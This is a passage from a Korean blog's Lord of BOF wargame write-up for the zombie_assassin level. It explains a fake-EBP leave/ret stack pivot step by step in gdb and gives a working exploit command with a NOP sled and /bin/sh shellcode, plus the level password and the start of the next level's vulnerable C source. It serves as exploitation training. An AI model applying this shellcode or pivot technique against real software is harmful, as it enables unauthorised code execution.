url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtUlEQVR42nXOyW7DMAxFUbmm5CCxPISiRpKy8/8fWaRuNy161484NCzSj3Ndl5iydk05R6JpmgCsqN5uk3XufL1Ymogi4vO5IyIGBAumcpPe930LkUQ4plhKcc5Z61j18biPAIFoWTyGMM93Y8wwDOaqtqa9b9saYhRhIqL4JVubc/Z+MeZn+jdmPs7DzzOlpMqpZHq//ZZrLTB+XNR3v45zKY3b4j1GalzDJTs3ArRWnQXzf58nuA9rV49MAwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f966d2796c118cfb3696d47c24ce8320/c9b55/0.webp 165w,\n/static/f966d2796c118cfb3696d47c24ce8320/f2908/0.webp 330w,\n/static/f966d2796c118cfb3696d47c24ce8320/1a14a/0.webp 411w\"\n              sizes=\"(max-width: 411px) 100vw, 411px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f966d2796c118cfb3696d47c24ce8320/04c57/0.png 165w,\n/static/f966d2796c118cfb3696d47c24ce8320/d9ecf/0.png 330w,\n/static/f966d2796c118cfb3696d47c24ce8320/2a432/0.png 411w\"\n            sizes=\"(max-width: 411px) 100vw, 411px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f966d2796c118cfb3696d47c24ce8320/2a432/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>disas main 명령어를 통해 leave를 하는 위치를 찾았다. leave ret을 하나씩 실행하고 경과를 지켜보기 위해 이 자리에 breakpoint를 걸고 차근차근 실행해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.84848484848485%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+0lEQVR42oWQQXLDIAxFAbkJJgYcBIJaDsa5/yE7xtNON3XfRn/zRl8SdatEKeecUno+n8772+0m1cEwDFIeUapjAoCUUvym1hoj5kyUCTG8Xi8iihGttbyyc66UT+dsohQwjGZ8PIwxRnfE1rZExOuaS154WXhBxBBCQMSIlMk6q6QCpc4W0OnNlMCIMUZrrfMeEZ1zPTut9UcHAMRfMLOdJmNMwKM8ABhjZEf8C1E+wziOzMs8z957KeVkJz/P9/v9Si6l/Mitta21U8gl73tDDJebM33Len/vW9uONwoRU6q1YoxXMiKeQWtda+V1hQH6OcTM0/S4kL8AQw0TqfgoYacAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e2663ba3e9ac329b1a6f41b820c86578/c9b55/1.webp 165w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/f2908/1.webp 330w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e2663ba3e9ac329b1a6f41b820c86578/04c57/1.png 165w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/d9ecf/1.png 330w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e2663ba3e9ac329b1a6f41b820c86578/32056/1.png\"\n            alt=\"info_register\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>A 40개는 buffer 40바이트, BBBB는 stack frame pointer, CCCC는 return 자리이다. 뒤의 D 200개는 padding과 쉘을 위치시킬 것을 고려해 입력해 보았다. 여기까지는 leave를 하기 전이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.939393939393941%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAfklEQVR42iWMUQ7DIAzFXpAIJVOBQaFA6O5/zKniz5Jlo49eaz3DmfNXRA5/GGOISOTj/eGcA8DsvPcistVmZsbze8pVAIQY+hi1NmY2hu7+TnPOAM4Qe+9jTmstGWp3m6oppR1fAGKKU2e735iIVHXMsb8xJV1L19pqj0opfxXDCbp5iOtjAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d2bb5cd5dea368048219384203686d1b/c9b55/2.webp 165w,\n/static/d2bb5cd5dea368048219384203686d1b/f2908/2.webp 330w,\n/static/d2bb5cd5dea368048219384203686d1b/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d2bb5cd5dea368048219384203686d1b/04c57/2.png 165w,\n/static/d2bb5cd5dea368048219384203686d1b/d9ecf/2.png 330w,\n/static/d2bb5cd5dea368048219384203686d1b/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d2bb5cd5dea368048219384203686d1b/32056/2.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.84848484848485%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABNklEQVR42k2RW3LjMAwE8WGK2opFyRafeBCQnfufMUUpce03q9EzQ7DDXu9XzgkAcilEWEoBgG3bWKTWcrvd/PyPmInwfv8CAGJBbI/HA+w43t/vUjIAlFq7jgcAWLdNTVl4cs7Pc9dupmFZAIBFepcYI4h2O+wyp5ylCxECQFhXFiGiaXKT98wDWJY7ACCRCO9xBxa2w2LcB5ySCF/mJQQWRkLnBkxMH7ghDnjfoWt/fb9KHrFjSkhY6+gcwkqEtVXnnPceCT+dW2uI7fl8jALSzzMnzEytXeaVmBD/zGfU5f5rZqbnc5hVer9i51x6/x0srGPtK7b3XoQ/sYlY+PTZYXYcf19VTZWZrrW7nmtPzvu5q9qhSzjX5nEopnjBn7XTf+ZVT9i5m/ezmqpZOGFiVu0pxR/f8ij3CqXgJQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/70924ddd89aab8857f0c94de6ba68e80/c9b55/3.webp 165w,\n/static/70924ddd89aab8857f0c94de6ba68e80/f2908/3.webp 330w,\n/static/70924ddd89aab8857f0c94de6ba68e80/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/70924ddd89aab8857f0c94de6ba68e80/04c57/3.png 165w,\n/static/70924ddd89aab8857f0c94de6ba68e80/d9ecf/3.png 330w,\n/static/70924ddd89aab8857f0c94de6ba68e80/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/70924ddd89aab8857f0c94de6ba68e80/32056/3.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>buffer와 argv 자리에 위치하고 있는 입력값들의 위치를 찾아 두었다. 그리고 si 명령어로 leave를 해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 354px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.545454545454554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVR42n2R4XKDIBCEiaYIeJYoInB3gHn/l2zVJM2kafcPM8t8x+4hkImYLhc7DIMQonnodBKH7ucbcWbOnFJCJGs/3TyXWqZphAGaphH/C4lCDKrrlhCMMZNzMUZmttYKIdq2lVK+wY44pRZj9LMvpVzX1TknhDifzyHG9/weOx/w6V5SSllqiSnCAPZiJzf1AMcgAOj7XmsNsJda17X/9XKtdQkLbbtkpbrD7wEQkZkRMWdu2+av2DWXTJm55AcspfSLTynucDbGiPVaoX+FS61EFFMiJqXU4SutZ++XsPCeqOuUyPln9g3uts5IiET77Q02xsQUty9lRqK2bbeFvSxzi31dS8m51lxK9xR7CYv3HhFLLQAgEqLW6hn+kB+cOcQQU/LeP3xtTErJuRkRx3H8tr4AeqMdCemAXfgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0da0109bacaaac6035ec6abbe85bfa20/c9b55/4.webp 165w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/f2908/4.webp 330w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/7d039/4.webp 354w\"\n              sizes=\"(max-width: 354px) 100vw, 354px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0da0109bacaaac6035ec6abbe85bfa20/04c57/4.png 165w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/d9ecf/4.png 330w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/8f50f/4.png 354w\"\n            sizes=\"(max-width: 354px) 100vw, 354px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0da0109bacaaac6035ec6abbe85bfa20/8f50f/4.png\"\n            alt=\"info_register2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ebp에 BBBB인 42424242가 위치해 있는 것을 볼 수 있다. 여기에서 leave 이후의 ret까지 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 367px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABK0lEQVR42o2S4a6DIAyFUeeGCCiKUGgL2/u/5I26LMuW3Hv7C0760dMTBBeerHHONUI0TdMeJf5ZpZYIkbksyzq7eZomrfU4jv+CufAgb37bjDWzmwEg5+zXVRxG+r7/DV6cE0fjeW3blpljDOcZEshB/gE3bzAxZczGGmutWxdtjBDicrmc6yiltNHNmcu6Lt8wJMiYuRSl1KkrpXLOXDjlTExd1x3w8j2ZSy3IhESv5Pq+95uHGPcnmJUadtX75WNnYiLCmIAKj/oJ36Tcti3EiDkj4fV63VVrzXsEbdsiIhHiPpjG8WlbShkhppSIGRG77tjZWPsBl8r1XonL/fHQWr9shxhCCCmlWqsxhz5NnzAAhBC89xFgGIZTv972vxBCWL3fwtYdaf8AmjsZiJTbdygAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6bba91738fc25a125141f1a311eadea8/c9b55/5.webp 165w,\n/static/6bba91738fc25a125141f1a311eadea8/f2908/5.webp 330w,\n/static/6bba91738fc25a125141f1a311eadea8/ddb01/5.webp 367w\"\n              sizes=\"(max-width: 367px) 100vw, 367px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6bba91738fc25a125141f1a311eadea8/04c57/5.png 165w,\n/static/6bba91738fc25a125141f1a311eadea8/d9ecf/5.png 330w,\n/static/6bba91738fc25a125141f1a311eadea8/46684/5.png 367w\"\n            sizes=\"(max-width: 367px) 100vw, 367px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6bba91738fc25a125141f1a311eadea8/46684/5.png\"\n            alt=\"info_register3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>eip가 BBBB 뒤의 값인 CCCC(43434343)으로 바뀐 것을 볼 수 있다. 원래 0x43434343 자리에는 다음에 실행할 명령어의 위치가 들어 있어야 할 것이다. 이제 CCCC(ret 위치) 대신 leave의 주소인 0x080484df를 입력하고, BBBB 자리에 적당한 주소로 bffffba0를 입력해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 355px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 58.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABWklEQVR42pWR246jMAxAU3IFktIFcrPjBPr/HzlLmanUTl/GD5Fi68jHNssA3q/W2nEc2V9DKSUEl1JywbuuY4xxfnyllI+SEJwfjxBd110ulxcYC7atAeSCOE3OWhtiwIIhppiStc4554Nf16UfeqXVC1yI/LpoY3zwxphlXUMIhYq7utNCKfVB+DSoterXsjZm27d5mRljUsqUs9bm88xEpB8yz3mMMa3VkKJz7vbvNs/zuUsppXN2tHYYBufcsaBtb2+dT9gHjwWxoNb6zI92BIBCBAhUiXPOWvugve+NiJAKIBrzDSutfPA5JwAgomEc2H5vWr/D9/tWKpVWqRb9A0spQwwh+BgjVZqmGyulSCnetbeWMeeH3hPuhz6lFGPEcsRxBSjIBf/dmSrVbaNanzMrpR6dAwDUVq2zDDErJd9gqhRjzIAxxWe+7/sMsKxrBrhO1/+3/gKRCh7OeluatgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/c9b55/6.webp 165w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/f2908/6.webp 330w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/918eb/6.webp 355w\"\n              sizes=\"(max-width: 355px) 100vw, 355px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/04c57/6.png 165w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/d9ecf/6.png 330w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/526ee/6.png 355w\"\n            sizes=\"(max-width: 355px) 100vw, 355px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/526ee/6.png\"\n            alt=\"info_register4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이전과 동일한 실행지점까지 실행시켜 보았다. eip가 080484df, ebp가 bffffba0으로 바뀌었다. 여기에서 한 줄 더 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 368px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABIElEQVR42o2QbXeDIAyFEbWiICqIhJfE/v9f2Sltt9Ot23L4APfkITeX4Y7TpOd5YYxxzqtHsf8UEUGAnPM0T8aYlPO6WqVUXdd/wxlz13WrW0c9zvMMAClFYw1jrKqqtm1/g41ZSl95cs6RcPPbea8hgBDiLbx8gzOmEOOoRz3pxRilFGOsaVo1KqnkIAel1L3fPhx+Tkb0ADEnROr7vuhSypgiIsYUU05vYSLEnRJmIhqkLPrlcnFuPRNJSHjfZXX2FT6/9+CJSD5gIQTECAFCDB6gaZpD1ZP+GgGvecZ8HsRj8lD0fugPMgQkjDFyzn+COd+vRFc6TO/7c+eu67z3m3PF9l3XenyBvferc25z1tqnLoTYtm1ZFu99yf+jbixTGYE3OKaZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2e00e025886577e904cbabf8a1071574/c9b55/7.webp 165w,\n/static/2e00e025886577e904cbabf8a1071574/f2908/7.webp 330w,\n/static/2e00e025886577e904cbabf8a1071574/146b9/7.webp 368w\"\n              sizes=\"(max-width: 368px) 100vw, 368px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2e00e025886577e904cbabf8a1071574/04c57/7.png 165w,\n/static/2e00e025886577e904cbabf8a1071574/d9ecf/7.png 330w,\n/static/2e00e025886577e904cbabf8a1071574/2b727/7.png 368w\"\n            sizes=\"(max-width: 368px) 100vw, 368px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2e00e025886577e904cbabf8a1071574/2b727/7.png\"\n            alt=\"info_register5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>eip가 ret인 080484e0로 바뀌고 ebp는 이전에 bffffba0에 들어있는 값인 44444444로 바뀌었다. 여기에서 한줄 더 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 352px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.15151515151515%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABOklEQVR42oWQ25KrIBBFCahBlCiJXBrobv3/n5zyqHk4Y9XsFwqKxV60yCXXWqd5mp0TQkgplVJSysfjIY5c601qLYgYY2Rm59zn85mm2b7sMA7iz0DOAKnrOh+8McY5F2JArG6ehRBKqefzeYMdOsw8juO+vfSatmEm75cDTin1fX/fjEgXfNJt2xJTgmRfr3me3+/3caFpmtGOwzgaY6y1UkqxbestHGLItZRa+14f52YYcs4Vay4ZCZVSgpl+a68rI2HBSkRmMNej3eJ9ShEAkHCnto2tvWnOpSQAYjLmhLXWCQAg5QwJYB8kIn7Fvs17bS2ntjmn1fd9gpRSQsRSyq6NxFr/B7fbtiIhMvG6fkfdtq0PPsbwT5ustQIAvr864abJOYcYfPCQQV9eT6192BNjXPyiGvUDeJkdQkCAMSwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7003c347f123f0e98313084b9f1042cd/c9b55/8.webp 165w,\n/static/7003c347f123f0e98313084b9f1042cd/f2908/8.webp 330w,\n/static/7003c347f123f0e98313084b9f1042cd/edd59/8.webp 352w\"\n              sizes=\"(max-width: 352px) 100vw, 352px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7003c347f123f0e98313084b9f1042cd/04c57/8.png 165w,\n/static/7003c347f123f0e98313084b9f1042cd/d9ecf/8.png 330w,\n/static/7003c347f123f0e98313084b9f1042cd/ba1c3/8.png 352w\"\n            sizes=\"(max-width: 352px) 100vw, 352px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7003c347f123f0e98313084b9f1042cd/ba1c3/8.png\"\n            alt=\"info_register6\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>eip마저 44444444로 바뀌었다. 이는 ebp+4에 위치하고 있는 값이었을 것이다. 일련의 과정들을 통해 fake EBP를 다음과 같이 정리해 볼 수 있다.\r\n본래의 SFP 자리에 어떤 주소지를 입력하고 ret 자리에 leave의 주소를 입력하면, SFP 자리에 입력된 주소지가 ebp가 되고, 거기서 4만큼 증가된 자리에 들어있는 주소지가 eip가 된다.\r\n이를 바탕으로 페이로드를 다음과 같이 작성하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">\r\n./zombie_assassin <span class=\"token variable\"><span class=\"token variable\">`</span>python –c ‘print “<span class=\"token punctuation\">\\</span>xa0<span class=\"token punctuation\">\\</span>xfb<span class=\"token punctuation\">\\</span>xff<span class=\"token punctuation\">\\</span>xbf”*10 + “<span class=\"token punctuation\">\\</span>xd0<span class=\"token punctuation\">\\</span>xf9<span class=\"token punctuation\">\\</span>xff<span class=\"token punctuation\">\\</span>xbf” + “<span class=\"token punctuation\">\\</span>xdf<span class=\"token punctuation\">\\</span>x84<span class=\"token punctuation\">\\</span>x04<span class=\"token punctuation\">\\</span>x08” + “<span class=\"token punctuation\">\\</span>x90”*100 + “<span class=\"token punctuation\">\\</span>x31<span class=\"token punctuation\">\\</span>xc0<span class=\"token punctuation\">\\</span>x50<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x73<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x62<span class=\"token punctuation\">\\</span>x69<span class=\"token punctuation\">\\</span>x6e<span class=\"token punctuation\">\\</span>x89<span class=\"token punctuation\">\\</span>xe3<span class=\"token punctuation\">\\</span>x50<span class=\"token punctuation\">\\</span>x53<span class=\"token punctuation\">\\</span>x89<span class=\"token punctuation\">\\</span>xe1<span class=\"token punctuation\">\\</span>x31<span class=\"token punctuation\">\\</span>xd2<span class=\"token punctuation\">\\</span>xb0<span class=\"token punctuation\">\\</span>x0b<span class=\"token punctuation\">\\</span>xcd<span class=\"token punctuation\">\\</span>x80” + “<span class=\"token punctuation\">\\</span>x90”*75’<span class=\"token variable\">`</span></span>\r\n</code></pre></div>\n<ol>\n<li>ret가 leave를 가리킴으로써 eip가 ret에 들어있는 주소값(\\xdf\\x84\\x04\\x08)으로 바뀐다.</li>\n<li>ebp가 SFP가 가리키는 주소(\\xd0\\xf9\\xff\\xbf)로 바뀐다.</li>\n<li>ebp가 SFP에 들어있는 주소가 가리키는 값(\\xa0\\xfb\\xff\\xbf)으로 바뀌고, +4가 된 주소에 들어있는 값이 eip에 담긴다.</li>\n<li>eip가 \\x90” * 100 + shellcode를 실행</li>\n</ol>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAArUlEQVR42oWOy27EMAhFSaKkMX4wBmIbdzOp8v/fOHJGrdRuehZIXCHOBTOrtTxybtb6Z1dVZk5EOWcRyZyZmYgSEYukGGNKIhJCuK4LWjNVRe9DjN77jxvn3D5wiLgsCwBM0/Qz53kGgFIKnF9n7zb8rTKLmZVR5IGI6ZsYIxHF+3uikTjnns8TrJuI1FoRcV3Xfd+3bYO/TL+W2z/MpRZVDcET0Tv9l/fZcRwvwX0NDB0EbQYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6a9e20c9356baf2f387eb5140d510a03/c9b55/9.webp 165w,\n/static/6a9e20c9356baf2f387eb5140d510a03/f2908/9.webp 330w,\n/static/6a9e20c9356baf2f387eb5140d510a03/ff4b8/9.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6a9e20c9356baf2f387eb5140d510a03/04c57/9.png 165w,\n/static/6a9e20c9356baf2f387eb5140d510a03/d9ecf/9.png 330w,\n/static/6a9e20c9356baf2f387eb5140d510a03/32056/9.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6a9e20c9356baf2f387eb5140d510a03/32056/9.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: no place to hide</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"c6ee78b0-ad04-5425-a623-b0f3a8ae1a24","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-16/","title":"LOB 16번 (assassin -> zombie_assassin)","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/83e1d875168ef03540c918a22ff6948f/a2478/0.png","srcSet":"/static/83e1d875168ef03540c918a22ff6948f/194ba/0.png 101w,\n/static/83e1d875168ef03540c918a22ff6948f/b6cea/0.png 202w,\n/static/83e1d875168ef03540c918a22ff6948f/a2478/0.png 403w","sizes":"(min-width: 403px) 403px, 100vw"},"sources":[{"srcSet":"/static/83e1d875168ef03540c918a22ff6948f/5ffd5/0.webp 101w,\n/static/83e1d875168ef03540c918a22ff6948f/741d6/0.webp 202w,\n/static/83e1d875168ef03540c918a22ff6948f/3a8fb/0.webp 403w","type":"image/webp","sizes":"(min-width: 403px) 403px, 100vw"}]},"width":660,"height":399.6029776674938}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - succubus\r\n        - calling functions continuously\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dumpcode.h></span></span>\r\n\r\n<span class=\"token comment\">// the inspector</span>\r\n<span class=\"token keyword\">int</span> check <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">MO</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cmd<span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check <span class=\"token operator\">!=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome to the MO!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// olleh!</span>\r\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">YUT</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span><span 